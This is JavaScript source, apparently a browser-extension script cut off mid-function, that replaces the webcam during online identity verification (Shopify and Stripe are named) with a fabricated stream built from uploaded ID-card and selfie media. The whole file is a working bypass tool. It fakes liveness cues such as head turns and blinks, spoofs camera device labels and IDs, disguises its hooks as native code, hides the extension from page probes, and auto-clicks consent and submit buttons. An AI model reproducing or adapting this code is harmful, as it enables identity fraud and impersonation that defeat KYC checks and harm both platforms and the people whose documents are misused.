// MAIN world — document_start — patches camera BEFORE any page script runs
;(function IDVPatcher() {

function ssGet(k)    { try { return sessionStorage.getItem(k) }  catch(_) { return null } }
function ssSet(k, v) { try { sessionStorage.setItem(k, v) }      catch(_) {} }

ssSet('__idv_phase__', 'id')

// ── Per-phase adjustment memory (front / back / selfie each remember their own) ─
const PHASE_ADJ = {
  front:  { zoom: 1.08, offX: 0, offY: 0 },
  back:   { zoom: 1.08, offX: 0, offY: 0 },
  selfie: { zoom: 1.05, offX: 0, offY: 0 }
}
function currentPhaseKey() {
  if (IDV.phase === 'selfie') return 'selfie'
  return IDV.idStep === 1 ? 'back' : 'front'
}

const IDV = {
  dlFront:      ssGet('__idv_dl_front__'),
  dlBack:       ssGet('__idv_dl_back__'),
  selfies:      [ssGet('__idv_selfie_0__'), ssGet('__idv_selfie_1__'), ssGet('__idv_selfie_2__')].filter(Boolean),
  selfieSlots:  [],     // [{kind:'image'|'video', src, vidEl, ready}]
  activeSelfieIdx: 0,   // which selfie slot is being shown
  phase:        'id',
  idStep:       0,
  camActive:    false,
  currentImg:   null,
  mirror:       true,
  noiseEnabled: true,
  faceOval:     null,
  adjZoom:      1.08,
  adjOffX:      0,
  adjOffY:      0
}

function srcKind(src) {
  if (!src || typeof src !== 'string') return null
  if (src.startsWith('data:video/') || src.startsWith('data:application/octet-stream')) return 'video'
  if (src.startsWith('data:image/')) return 'image'
  if (src.startsWith('data:')) return 'image'  // fallback
  return 'image'
}

function getActiveSelfieSlot() {
  return IDV.selfieSlots[IDV.activeSelfieIdx] || IDV.selfieSlots[0] || null
}

// Grab current frame of a <video> as an <img>, so drawImage has a sane fallback
async function captureVideoFrame(vid) {
  if (!vid || vid.readyState < 2 || !vid.videoWidth) return null
  try {
    const c = document.createElement('canvas')
    c.width = vid.videoWidth; c.height = vid.videoHeight
    c.getContext('2d').drawImage(vid, 0, 0)
    const dataUrl = c.toDataURL('image/jpeg', 0.9)
    return await new Promise(resolve => {
      const img = new Image()
      img.onload  = () => resolve(img)
      img.onerror = () => resolve(null)
      img.src = dataUrl
    })
  } catch(_) { return null }
}

// Switch to selfie source — pick the right thing for IDV.currentImg
async function activateSelfieSource() {
  const slot = getActiveSelfieSlot()
  if (!slot) {
    IDV.currentImg = null
    return
  }
  if (slot.kind === 'video' && slot.vidEl) {
    startSelfieVideo(slot.vidEl)
    // Capture first frame as fallback (so we never show stale ID image)
    const frameImg = await captureVideoFrame(slot.vidEl)
    if (frameImg) IDV.currentImg = frameImg
    else IDV.currentImg = null  // clear stale ID
    // Retry capture after short delay if video wasn't ready yet
    if (!frameImg) {
      setTimeout(async () => {
        const f = await captureVideoFrame(slot.vidEl)
        if (f) IDV.currentImg = f
      }, 600)
    }
  } else if (slot.kind === 'image') {
    const img = await loadImg(slot.src)
    if (img) IDV.currentImg = img
  }
}

// ── Message bus ────────────────────────────────────────────────────────────────
window.addEventListener('message', ev => {
  if (ev.source !== window) return
  const d = ev.data
  if (d?._idv === 'IDV_SET') {
    if (d.dlFront)         IDV.dlFront = d.dlFront
    if (d.dlBack)          IDV.dlBack  = d.dlBack
    if (d.selfies?.length) {
      IDV.selfies = d.selfies
      rebuildSelfieSlots()
    }
    if (d.phase) IDV.phase = d.phase
    updateBadge()
  }
  if (d?._idv === 'IDV_SELFIE_SLOT') {
    IDV.activeSelfieIdx = d.index || 0
    activateSelfieSource()
  }
  if (d?._idv === 'IDV_SWITCH') {
    IDV.phase  = d.phase  ?? IDV.phase
    IDV.idStep = d.idStep ?? IDV.idStep
    ssSet('__idv_phase__', IDV.phase)
    const a = PHASE_ADJ[currentPhaseKey()]
    IDV.adjZoom = a.zoom; IDV.adjOffX = a.offX; IDV.adjOffY = a.offY
    showToast('⬡ IDV: ' + (IDV.phase === 'selfie' ? 'Selfie' : IDV.idStep === 1 ? 'ID Back' : 'ID Front'), '#1e3a5f')
    if (IDV.camActive) {
      if (IDV.phase === 'selfie') activateSelfieSource()
      else loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
    }
  }
  if (d?._idv === 'IDV_ADJUST') {
    if (d.zoom !== undefined) IDV.adjZoom = d.zoom
    if (d.offX !== undefined) IDV.adjOffX = d.offX
    if (d.offY !== undefined) IDV.adjOffY = d.offY
    // Save into per-phase memory
    const pk = currentPhaseKey()
    PHASE_ADJ[pk].zoom = IDV.adjZoom
    PHASE_ADJ[pk].offX = IDV.adjOffX
    PHASE_ADJ[pk].offY = IDV.adjOffY
  }
  if (d?._idv === 'IDV_TOGGLE') {
    if (d.mirror !== undefined) IDV.mirror = !!d.mirror
    if (d.noise  !== undefined) IDV.noiseEnabled = !!d.noise
  }
})

function pickSrc() {
  if (IDV.phase === 'selfie') {
    const slot = getActiveSelfieSlot()
    return slot?.src || IDV.selfies[0] || IDV.dlFront
  }
  return IDV.idStep === 1 ? (IDV.dlBack || IDV.dlFront) : IDV.dlFront
}

// ── Build selfie slots (image OR video per slot) ──────────────────────────────
function rebuildSelfieSlots() {
  // Tear down old video elements
  IDV.selfieSlots.forEach(s => {
    if (s.vidEl) { try { s.vidEl.pause(); s.vidEl.src = ''; s.vidEl.remove() } catch(_) {} }
  })
  IDV.selfieSlots = []
  IDV.selfies.forEach((src, idx) => {
    if (!src) return
    const kind = srcKind(src)
    const slot = { kind, src, ready: false, vidEl: null }
    if (kind === 'video') prepSlotVideo(slot, idx)
    else slot.ready = true
    IDV.selfieSlots.push(slot)
  })
  console.log('[IDV] Selfie slots:', IDV.selfieSlots.map(s => s.kind).join(','))
}

function prepSlotVideo(slot, idx) {
  const blobUrl = b64ToBlob(slot.src)
  if (!blobUrl) { console.log('[IDV] slot ' + idx + ' video blob fail'); return }
  const vid = document.createElement('video')
  vid.muted = true; vid.loop = true; vid.playsInline = true
  vid.autoplay = true; vid.preload = 'auto'
  vid.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:2px;height:2px;opacity:0.01;pointer-events:none;z-index:-1'
  vid.addEventListener('loadeddata', async () => {
    slot.ready = true
    console.log('[IDV] ✓ slot ' + idx + ' video loaded: ' + vid.videoWidth + 'x' + vid.videoHeight)
    vid.play().catch(_ => {})
    // Pre-capture poster frame so we have an instant fallback image
    const poster = await captureVideoFrame(vid)
    if (poster) slot.poster = poster
    updateBadge()
    // If we're already in selfie phase, refresh currentImg to poster (clears stale ID)
    if (IDV.phase === 'selfie' && IDV.camActive && slot.poster) IDV.currentImg = slot.poster
  })
  vid.addEventListener('error', () => console.log('[IDV] slot ' + idx + ' video error'))
  vid.src = blobUrl
  const attach = () => { document.body.appendChild(vid); vid.load() }
  if (document.body) attach()
  else document.addEventListener('DOMContentLoaded', attach)
  slot.vidEl = vid
}

function startSelfieVideo(vidEl) {
  if (!vidEl) return
  vidEl.muted = true; vidEl.loop = true; vidEl.playsInline = true
  if (vidEl.paused) vidEl.play().catch(_ => {})
  setTimeout(() => { if (vidEl.paused) vidEl.play().catch(_ => {}) }, 200)
  setTimeout(() => { if (vidEl.paused) vidEl.play().catch(_ => {}) }, 800)
}

// Build slots on initial load
if (IDV.selfies.length) rebuildSelfieSlots()

// ── On-screen badge ───────────────────────────────────────────────────────────
let badge = null
function initBadge() {
  if (badge || !document.body) return
  badge = document.createElement('div')
  badge.style.cssText = 'position:fixed;bottom:10px;right:10px;z-index:2147483647;' +
    'padding:4px 12px;border-radius:20px;font-size:11px;font-family:monospace;font-weight:700;' +
    'pointer-events:none;transition:background .3s,color .3s;box-shadow:0 2px 8px rgba(0,0,0,.5)'
  document.body.appendChild(badge)
  updateBadge()
}
function updateBadge() {
  if (!badge) return
  const hasVid = IDV.selfieSlots.some(s => s.kind === 'video' && s.ready)
  const vidTag = hasVid ? ' 🎬' : ''
  if (IDV.camActive) {
    badge.style.background = '#052005'; badge.style.color = '#4ade80'
    badge.style.border = '1px solid #14532d'; badge.textContent = '⬡ IDV CAM ACTIVE' + vidTag
  } else if (IDV.dlFront) {
    badge.style.background = '#030d2d'; badge.style.color = '#60a5fa'
    badge.style.border = '1px solid #1d4ed8'; badge.textContent = '⬡ IDV READY' + vidTag
  } else {
    badge.style.background = '#1a0505'; badge.style.color = '#f87171'
    badge.style.border = '1px solid #7f1d1d'; badge.textContent = '⬡ IDV NO IMAGE'
  }
}
function showToast(msg, bg) {
  if (!document.body) return
  const t = document.createElement('div')
  t.style.cssText = 'position:fixed;top:14px;left:50%;transform:translateX(-50%);z-index:2147483647;' +
    'padding:8px 20px;border-radius:8px;font-size:12px;font-family:monospace;font-weight:700;' +
    'color:#fff;background:' + (bg||'#1e3a5f') + ';box-shadow:0 3px 14px rgba(0,0,0,.6);pointer-events:none'
  t.textContent = msg
  document.body.appendChild(t)
  setTimeout(() => t.remove(), 3500)
}
if (document.body) initBadge()
else document.addEventListener('DOMContentLoaded', initBadge)

// ── b64 → Blob URL (bypass CSP data: block) ───────────────────────────────────
function b64ToBlob(dataUrl) {
  try {
    const [header, b64] = dataUrl.split(',')
    const mime = header.match(/:(.*?);/)[1]
    const bin  = atob(b64)
    const arr  = new Uint8Array(bin.length)
    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i)
    return URL.createObjectURL(new Blob([arr], { type: mime }))
  } catch(e) { return null }
}
function loadImg(src) {
  return new Promise(resolve => {
    if (!src) return resolve(null)
    const img = new Image()
    img.onload  = () => resolve(img)
    img.onerror = () => resolve(null)
    setTimeout(() => resolve(null), 6000)
    img.src = src.startsWith('data:') ? (b64ToBlob(src) || src) : src
  })
}

// ── Auto-detect Shopify camera dimensions ─────────────────────────────────────
function detectCameraSize() {
  // Look for the camera <video> element Shopify renders
  const vids = document.querySelectorAll('video')
  for (const v of vids) {
    if (v.srcObject || v.offsetParent) {
      const w = v.clientWidth || v.videoWidth
      const h = v.clientHeight || v.videoHeight
      if (w >= 100 && h >= 100) return { w, h }
    }
  }
  return { w: 1280, h: 720 }
}

// ── Image auto-enhancement (brightness/contrast normalization) ────────────────
function autoEnhance(img) {
  try {
    const c = document.createElement('canvas')
    c.width = img.naturalWidth; c.height = img.naturalHeight
    const ctx = c.getContext('2d')
    ctx.drawImage(img, 0, 0)
    const id = ctx.getImageData(0, 0, c.width, c.height)
    const d = id.data
    // Compute luminance histogram → find min/max for contrast stretch
    let lo = 255, hi = 0
    for (let i = 0; i < d.length; i += 4) {
      const l = 0.299*d[i] + 0.587*d[i+1] + 0.114*d[i+2]
      if (l < lo) lo = l
      if (l > hi) hi = l
    }
    // Clip extremes (avoid blowing out)
    lo = Math.max(0,   lo + 8)
    hi = Math.min(255, hi - 4)
    const range = Math.max(1, hi - lo)
    const gamma = 0.95  // slight midtone lift
    for (let i = 0; i < d.length; i += 4) {
      for (let k = 0; k < 3; k++) {
        let v = (d[i+k] - lo) / range
        v = Math.max(0, Math.min(1, v))
        v = Math.pow(v, gamma)
        d[i+k] = v * 255
      }
    }
    ctx.putImageData(id, 0, 0)
    // Convert back to Image
    return new Promise(res => {
      const out = new Image()
      out.onload = () => res(out)
      out.onerror = () => res(img)
      out.src = c.toDataURL('image/jpeg', 0.95)
    })
  } catch(_) { return Promise.resolve(img) }
}

// ── Liveness yaw curve ────────────────────────────────────────────────────────
function easeInOut(t) { return t < .5 ? 2*t*t : -1+(4-2*t)*t }
function livenessYaw(elapsed) {
  const t = elapsed % 8000
  if (t < 2000) return 0
  if (t < 3500) return -28 * easeInOut((t-2000)/1500)
  if (t < 4500) return -28
  if (t < 6000) return -28 + 56 * easeInOut((t-4500)/1500)
  if (t < 7000) return 28
  return 28 * (1 - easeInOut((t-7000)/1000))
}

// ── Build fake video stream ───────────────────────────────────────────────────
async function buildFakeStream(src) {
  // Detect if src is a video — if yes, don't try to load it as Image
  const srcType = srcKind(src)
  let img = null
  if (srcType === 'image') {
    img = await loadImg(src)
    if (img) img = await autoEnhance(img)
  } else if (srcType === 'video') {
    const fallbackSrc = IDV.dlFront || IDV.dlBack
    if (fallbackSrc) {
      img = await loadImg(fallbackSrc)
      if (img) img = await autoEnhance(img)
    }
  }
  const isSelfieVideo = IDV.phase === 'selfie' && getActiveSelfieSlot()?.kind === 'video'
  if (!img && !isSelfieVideo) {
    console.log('[IDV] buildFakeStream: no image and no video slot — aborting')
    return null
  }

  // Auto-detect Shopify camera dimensions for matching aspect ratio
  const det = detectCameraSize()
  // Use detected aspect but min 1280px wide for ML quality
  const aspect = det.w / det.h
  const W = aspect >= 1 ? 1280 : Math.round(720 * aspect)
  const H = aspect >= 1 ? Math.round(1280 / aspect) : 1280
  console.log('[IDV] Canvas size: ' + W + 'x' + H + ' (detected ratio ' + aspect.toFixed(2) + ')')

  const canvas = document.createElement('canvas')
  canvas.width = W; canvas.height = H
  const ctx = canvas.getContext('2d')
  ctx.fillStyle = '#111'; ctx.fillRect(0, 0, W, H)

  // Pre-render the blurred background for the current image (cache)
  let bgCanvas = null
  function rebuildBackground(srcImg) {
    if (!srcImg) return
    bgCanvas = document.createElement('canvas')
    bgCanvas.width = W; bgCanvas.height = H
    const bctx = bgCanvas.getContext('2d')
    // Cover-fill the image with heavy blur (iPhone wallpaper style background)
    const fillScale = Math.max(W / srcImg.naturalWidth, H / srcImg.naturalHeight) * 1.4
    const fw = srcImg.naturalWidth * fillScale
    const fh = srcImg.naturalHeight * fillScale
    bctx.filter = 'blur(40px) brightness(0.75) saturate(1.1)'
    bctx.drawImage(srcImg, (W - fw)/2, (H - fh)/2, fw, fh)
    bctx.filter = 'none'
    // Subtle vignette gradient
    const g = bctx.createRadialGradient(W/2, H/2, H*.3, W/2, H/2, H*.8)
    g.addColorStop(0, 'rgba(0,0,0,0)')
    g.addColorStop(1, 'rgba(0,0,0,0.35)')
    bctx.fillStyle = g; bctx.fillRect(0, 0, W, H)
  }
  if (img) rebuildBackground(img)

  if (img) IDV.currentImg = img
  let ox = 0, oy = 0, sc = 1, vx = 0.15, vy = 0.1, vs = 0.0001
  const streamStart = performance.now()

  // Chromatic sensor-like noise (RGB micro-variation, low alpha — looks real)
  function applyNoise() {
    if (!IDV.noiseEnabled) return
    // Luma noise dots
    for (let i = 0; i < 180; i++) {
      const x = Math.random() * W | 0
      const y = Math.random() * H | 0
      const g = 90 + (Math.random() * 130 | 0)
      ctx.fillStyle = `rgba(${g},${g},${g},0.045)`
      ctx.fillRect(x, y, 2, 2)
    }
    // Chroma micro-noise (color variation, very subtle)
    for (let i = 0; i < 60; i++) {
      const x = Math.random() * W | 0
      const y = Math.random() * H | 0
      const r = 80 + (Math.random() * 80 | 0)
      const g = 80 + (Math.random() * 80 | 0)
      const b = 80 + (Math.random() * 80 | 0)
      ctx.fillStyle = `rgba(${r},${g},${b},0.04)`
      ctx.fillRect(x, y, 2, 2)
    }
  }

  function drawVideo() {
    const slot = getActiveSelfieSlot()
    if (!slot || slot.kind !== 'video' || !slot.vidEl) return false
    const vid = slot.vidEl
    if (vid.readyState < 2) return false
    const vw = vid.videoWidth, vh = vid.videoHeight
    if (!vw || !vh) return false
    if (vid.paused) vid.play().catch(_ => {})

    // Draw blurred version of CURRENT video frame as background, then sharp on top
    const tmpW = 96, tmpH = Math.round(96 * vh / vw)
    if (!drawVideo._bgC) {
      drawVideo._bgC = document.createElement('canvas')
      drawVideo._bgC.width = tmpW; drawVideo._bgC.height = tmpH
    }
    const bgC = drawVideo._bgC
    bgC.getContext('2d').drawImage(vid, 0, 0, tmpW, tmpH)
    ctx.filter = 'blur(40px) brightness(0.75)'
    const fillS = Math.max(W / tmpW, H / tmpH) * 1.4
    ctx.drawImage(bgC, (W - tmpW*fillS)/2, (H - tmpH*fillS)/2, tmpW*fillS, tmpH*fillS)
    ctx.filter = 'none'

    // Sharp video draw (fit/contain into frame)
    const s = Math.min(W / vw, H / vh) * IDV.adjZoom
    const dw = vw * s, dh = vh * s
    const dx = (W - dw) / 2 + IDV.adjOffX
    const dy = (H - dh) / 2 + IDV.adjOffY
    ctx.save()
    if (IDV.mirror) {
      ctx.translate(W, 0); ctx.scale(-1, 1)
      ctx.drawImage(vid, W - dx - dw, dy, dw, dh)
    } else {
      ctx.drawImage(vid, dx, dy, dw, dh)
    }
    ctx.restore()
    return true
  }

  function drawImage() {
    const ci = IDV.currentImg || img
    if (!ci) {
      ctx.fillStyle = '#111'; ctx.fillRect(0, 0, W, H)
      ctx.fillStyle = '#1e3a5f'; ctx.font = '24px monospace'; ctx.textAlign = 'center'
      ctx.fillText('⬡ Loading…', W/2, H/2)
      return
    }
    // Rebuild bg canvas if image changed
    if (!bgCanvas || bgCanvas._forImg !== ci) {
      rebuildBackground(ci)
      if (bgCanvas) bgCanvas._forImg = ci
    }
    const baseScale = Math.min(W / ci.naturalWidth, H / ci.naturalHeight) * IDV.adjZoom
    ox += vx; oy += vy; sc += vs
    if (Math.abs(ox) > 8)   vx *= -1
    if (Math.abs(oy) > 5)   vy *= -1
    if (sc > 1.018 || sc < 0.982) vs *= -1
    const s = baseScale * sc

    // Background: blurred extension (no black bars)
    if (bgCanvas) ctx.drawImage(bgCanvas, 0, 0)
    else { ctx.fillStyle = '#111'; ctx.fillRect(0, 0, W, H) }

    if (IDV.phase === 'selfie') {
      const elapsed = performance.now() - streamStart
      const yawDeg = livenessYaw(elapsed)
      const yawRad = yawDeg * Math.PI / 180
      const xScale = Math.cos(yawRad)
      // Subtle pitch (head nod) — sinusoidal, smaller amplitude
      const pitch = Math.sin(elapsed / 2200) * 4
      // Breathing motion — very small vertical shift
      const breath = Math.sin(elapsed / 1900) * 3
      const yShift = Math.abs(yawDeg) * 0.6 + breath
      const iw = ci.naturalWidth * s, ih = ci.naturalHeight * s
      ctx.save()
      ctx.translate(W/2 + IDV.adjOffX, H/2 + IDV.adjOffY - yShift)
      if (IDV.mirror) ctx.scale(-xScale, 1)
      else            ctx.scale(xScale, 1)
      // Apply pitch as small Y skew
      ctx.transform(1, pitch * 0.003, 0, 1, 0, 0)
      ctx.drawImage(ci, -iw/2 + ox, -ih/2 + oy, iw, ih)
      ctx.restore()
      // Eye blink overlay — every ~3.5s, very brief (120ms)
      const blinkCycle = elapsed % 3500
      if (blinkCycle > 3400) {
        // Estimate eye y position (top 38% of face area, which is center of frame)
        const eyeY = H/2 + IDV.adjOffY - ih * 0.12
        const eyeXL = W/2 + IDV.adjOffX - iw * 0.10
        const eyeXR = W/2 + IDV.adjOffX + iw * 0.10
        const eyeW = iw * 0.08, eyeH = ih * 0.015
        ctx.fillStyle = 'rgba(110, 80, 70, 0.55)'
        ctx.fillRect(eyeXL - eyeW/2, eyeY - eyeH/2, eyeW, eyeH)
        ctx.fillRect(eyeXR - eyeW/2, eyeY - eyeH/2, eyeW, eyeH)
      }
    } else {
      ctx.drawImage(ci,
        (W - ci.naturalWidth*s)/2  + ox + IDV.adjOffX,
        (H - ci.naturalHeight*s)/2 + oy + IDV.adjOffY,
        ci.naturalWidth*s, ci.naturalHeight*s)
    }
  }

  function draw() {
    // For selfie phase: prefer video if available, fallback to animated image
    if (IDV.phase === 'selfie' && drawVideo()) {
      // video drew successfully — add noise + vignette
    } else {
      drawImage()
    }
    applyNoise()
    // Subtle outer vignette (bg already has one — this is the camera lens vignette)
    const g = ctx.createRadialGradient(W/2, H/2, H*.4, W/2, H/2, H*.78)
    g.addColorStop(0, 'rgba(0,0,0,0)'); g.addColorStop(1, 'rgba(0,0,0,0.15)')
    ctx.fillStyle = g; ctx.fillRect(0, 0, W, H)
  }
  draw()

  let stream, stopFn

  if (typeof MediaStreamTrackGenerator !== 'undefined' && typeof VideoFrame !== 'undefined') {
    try {
      const gen = new MediaStreamTrackGenerator({ kind: 'video' })
      const writer = gen.writable.getWriter()
      let alive = true
      async function pump(ts) {
        if (!alive) return
        if (IDV.phase === 'selfie') { const s = getActiveSelfieSlot(); if (s?.kind === 'video' && s.vidEl?.paused) startSelfieVideo(s.vidEl) }
        draw()
        const vf = new VideoFrame(canvas, { timestamp: Math.floor(ts * 1000), duration: 33333 })
        try { await writer.write(vf) } catch(_) {}
        vf.close()
        requestAnimationFrame(pump)
      }
      requestAnimationFrame(pump)
      stream = new MediaStream([gen])
      stopFn = () => { alive = false; try { writer.close() } catch(_) {} }
    } catch(e) { stream = null }
  }

  if (!stream) {
    const iv = setInterval(() => {
      if (IDV.phase === 'selfie' && IDV.selfieVidEl?.paused) startSelfieVideo()
      draw()
    }, 33)
    stream = canvas.captureStream(30)
    stopFn = () => clearInterval(iv)
  }

  // ── Add fake audio track (silent — most cameras have mic, sites probe for it) ─
  try {
    const ac  = new (window.AudioContext || window.webkitAudioContext)()
    const osc = ac.createOscillator()
    const dst = ac.createMediaStreamDestination()
    const gain = ac.createGain()
    gain.gain.value = 0.00001  // virtually silent
    osc.frequency.value = 50
    osc.connect(gain).connect(dst)
    osc.start()
    const audioTrack = dst.stream.getAudioTracks()[0]
    if (audioTrack) {
      Object.defineProperty(audioTrack, 'label', { get: () => 'FaceTime HD Camera Microphone', configurable: true })
      // Don't auto-add audio — only when video requested with audio
    }
    stream._fakeAudio = audioTrack
    stream._fakeAudioCtx = ac
  } catch(_) {}

  // Spoof track metadata
  const track = stream.getVideoTracks()[0]
  if (track) {
    Object.defineProperty(track, 'label', { get: () => 'FaceTime HD Camera', configurable: true })
    track.getSettings     = () => ({ width:W, height:H, frameRate:30, facingMode: IDV.phase==='selfie'?'user':'environment', deviceId:'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2', groupId:'g1r2o3u4p5' })
    track.getCapabilities = () => ({ width:{min:1,max:1920}, height:{min:1,max:1080}, frameRate:{min:1,max:60}, facingMode: ['user','environment'] })
    track.getConstraints  = () => ({})
    const origStop = track.stop.bind(track)
    track.stop = () => { stopFn?.(); origStop(); IDV.camActive = false; updateBadge() }
  }

  IDV.camActive = true
  updateBadge()
  return stream
}

// ── CAMERA HOOK — Triple-layer override with anti-detection ───────────────────
const _realMD  = navigator.mediaDevices
const _origGUM = _realMD?.getUserMedia?.bind(_realMD)
const _origED  = _realMD?.enumerateDevices?.bind(_realMD)

if (_origGUM) {

  const fakeGUM = async function getUserMedia(constraints) {
    if (!constraints?.video) return _origGUM(constraints)

    // Always start with DL Front when camera opens (unless explicitly selfie facingMode requested)
    const wantsUser = (typeof constraints.video === 'object') &&
                      (constraints.video.facingMode === 'user' ||
                       constraints.video.facingMode?.exact === 'user' ||
                       constraints.video.facingMode?.ideal === 'user')
    if (wantsUser) {
      IDV.phase = 'selfie'; ssSet('__idv_phase__', 'selfie')
      activateSelfieSource()
    } else {
      IDV.phase = 'id'; IDV.idStep = 0; ssSet('__idv_phase__', 'id')
    }
    // Restore per-phase adjustments
    const a = PHASE_ADJ[currentPhaseKey()]
    IDV.adjZoom = a.zoom; IDV.adjOffX = a.offX; IDV.adjOffY = a.offY

    // Wait briefly for sources to be available
    for (let i = 0; i < 40; i++) {
      const slot = getActiveSelfieSlot()
      const haveSomething = IDV.dlFront || (IDV.phase === 'selfie' && slot)
      if (haveSomething) break
      const ss = ssGet('__idv_dl_front__')
      if (ss) { IDV.dlFront = ss; break }
      await new Promise(r => setTimeout(r, 200))
    }

    const src = pickSrc()
    const slot = getActiveSelfieSlot()
    const hasVideoSlot = IDV.phase === 'selfie' && slot?.kind === 'video'
    if (!src && !hasVideoSlot) {
      showToast('⬡ IDV: Upload images first!', '#7f1d1d')
      return _origGUM(constraints)
    }

    showToast('⬡ IDV: Injecting fake camera…', '#1e3a5f')
    const fake = await buildFakeStream(src || IDV.dlFront)
    if (!fake) {
      showToast('⬡ IDV: Stream failed — real camera', '#7f1d1d')
      return _origGUM(constraints)
    }
    // Make sure video plays
    if (hasVideoSlot && slot.vidEl) startSelfieVideo(slot.vidEl)

    // If audio requested, attach fake audio track
    if (constraints.audio && fake._fakeAudio) {
      try { fake.addTrack(fake._fakeAudio) } catch(_) {}
    }

    showToast('⬡ IDV: FAKE CAMERA ACTIVE!', '#052e16')
    return fake
  }

  Object.defineProperty(fakeGUM, 'name', { value: 'getUserMedia', configurable: true })
  fakeGUM.toString = () => 'function getUserMedia() { [native code] }'

  const fakeED = async function enumerateDevices() {
    const real = await _origED().catch(() => [])
    const FAKE_VIDEO = {
      deviceId: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2',
      groupId:  'g1r2o3u4p5',
      kind:     'videoinput',
      label:    'FaceTime HD Camera',
      toJSON()  { return { deviceId:this.deviceId, groupId:this.groupId, kind:this.kind, label:this.label } }
    }
    const FAKE_AUDIO = {
      deviceId: 'b1c2d3e4f5a6b1c2d3e4f5a6b1c2d3e4f5a6b1c2d3e4f5a6b1c2d3e4f5a6b1c2',
      groupId:  'g1r2o3u4p5',
      kind:     'audioinput',
      label:    'FaceTime HD Camera Microphone',
      toJSON()  { return { deviceId:this.deviceId, groupId:this.groupId, kind:this.kind, label:this.label } }
    }
    if (!real.some(d => d.kind === 'videoinput')) real.unshift(FAKE_VIDEO)
    if (!real.some(d => d.kind === 'audioinput')) real.push(FAKE_AUDIO)
    return real
  }
  fakeED.toString = () => 'function enumerateDevices() { [native code] }'

  // LAYER 1: Proxy on navigator.mediaDevices
  try {
    Object.defineProperty(navigator, 'mediaDevices', {
      get() {
        return new Proxy(_realMD, {
          get(t, p) {
            if (p === 'getUserMedia')     return fakeGUM
            if (p === 'enumerateDevices') return fakeED
            const v = t[p]; return typeof v === 'function' ? v.bind(t) : v
          }
        })
      },
      configurable: true
    })
  } catch(e) {}

  // LAYER 2: Prototype
  if (typeof MediaDevices !== 'undefined') {
    try {
      Object.defineProperty(MediaDevices.prototype, 'getUserMedia', {
        get() { return fakeGUM }, set() {}, configurable: true
      })
      Object.defineProperty(MediaDevices.prototype, 'enumerateDevices', {
        get() { return fakeED }, set() {}, configurable: true
      })
    } catch(e) {}
  }

  // LAYER 3: Legacy
  try { navigator.getUserMedia       = (c,s,e) => fakeGUM(c).then(s).catch(e) } catch(_) {}
  try { navigator.webkitGetUserMedia = (c,s,e) => fakeGUM(c).then(s).catch(e) } catch(_) {}

  // ImageCapture override
  if (typeof ImageCapture !== 'undefined') {
    const _OIC = ImageCapture
    window.ImageCapture = class {
      constructor(track) { this._t = track; this._r = new _OIC(track) }
      async grabFrame() {
        const i = await loadImg(pickSrc()); if (!i) return this._r.grabFrame()
        return createImageBitmap(i)
      }
      async takePhoto(o) {
        const i = await loadImg(pickSrc()); if (!i) return this._r.takePhoto(o)
        const c = document.createElement('canvas')
        c.width = i.naturalWidth; c.height = i.naturalHeight
        c.getContext('2d').drawImage(i, 0, 0)
        return new Promise(r => c.toBlob(r, 'image/jpeg', 0.95))
      }
      get track() { return this._t }
      getPhotoCapabilities() { return this._r.getPhotoCapabilities?.() }
      getPhotoSettings()     { return this._r.getPhotoSettings?.() }
    }
  }

  // ── Anti-detection ────────────────────────────────────────────────────────
  try {
    const origTS = Function.prototype.toString
    Function.prototype.toString = function() {
      if (this === fakeGUM || this === fakeED) return `function ${this.name || ''}() { [native code] }`
      return origTS.call(this)
    }
    Object.defineProperty(Function.prototype.toString, 'toString', {
      value: () => 'function toString() { [native code] }', configurable: true
    })
  } catch(_) {}

  // Hide extension chrome.runtime.id from page probes
  try {
    if (window.chrome?.runtime?.id) {
      const _chrome = window.chrome
      Object.defineProperty(window, 'chrome', {
        get() {
          return new Proxy(_chrome, {
            get(t, p) {
              if (p === 'runtime') return new Proxy(t.runtime, {
                get(rt, rp) {
                  if (rp === 'id') return undefined
                  if (rp === 'sendMessage' || rp === 'connect') return () => {}
                  const v = rt[rp]; return typeof v === 'function' ? v.bind(rt) : v
                }
              })
              const v = t[p]; return typeof v === 'function' ? v.bind(t) : v
            }
          })
        },
        configurable: true
      })
    }
  } catch(_) {}

  // Hide WebRTC IP leak (some IDV providers use this for fingerprinting)
  try {
    if (typeof RTCPeerConnection !== 'undefined') {
      const _origPC = RTCPeerConnection.prototype.createOffer
      // No modification — just keep existing. Safe placeholder.
    }
  } catch(_) {}
}

// ── DOM watcher: phase detect + auto-click ────────────────────────────────────
const SELFIE_W  = ['selfie','your face','look at the camera','photo of yourself','center your face','take a photo of your face','take a selfie','face the camera','look straight','head turn']
const BACK_W    = ['back of your','flip your','other side','back side','reverse side','back of the','flip the','back of id','turn the card']
const ADVANCE_W = ['looks good','use this photo','captured','✓ captured','photo captured','great','perfect','well done','identity verified']
const CLICK_W   = ['looks good','use this photo','use photo','confirm','continue','next','submit','done','agree','accept','i agree','i consent','get started','start','begin','take photo','retake','try again','allow','enable camera']

let _lastTxt = ''
let _autoClickTimer = null

function checkDOM() {
  const txt = document.body?.innerText?.toLowerCase() || ''
  if (txt === _lastTxt) return
  _lastTxt = txt

  // Face oval detection (Stripe uses a SVG circle/path inside the camera container)
  try {
    const ovals = document.querySelectorAll('svg circle, svg ellipse')
    for (const o of ovals) {
      const r = o.getBoundingClientRect()
      if (r.width > 100 && r.width < 600) { IDV.faceOval = r; break }
    }
  } catch(_) {}

  if (!IDV.camActive) return

  if (IDV.phase === 'id' && IDV.idStep === 0 && BACK_W.some(w => txt.includes(w))) {
    IDV.idStep = 1
    const a = PHASE_ADJ.back; IDV.adjZoom = a.zoom; IDV.adjOffX = a.offX; IDV.adjOffY = a.offY
    loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
  }
  if (IDV.phase !== 'selfie' && SELFIE_W.some(w => txt.includes(w))) {
    IDV.phase = 'selfie'; ssSet('__idv_phase__', 'selfie')
    const a = PHASE_ADJ.selfie; IDV.adjZoom = a.zoom; IDV.adjOffX = a.offX; IDV.adjOffY = a.offY
    window.postMessage({ _idv: 'IDV_PHASE_REQUEST', phase: 'selfie' }, '*')
    activateSelfieSource()
  }
  if (ADVANCE_W.some(w => txt.includes(w))) {
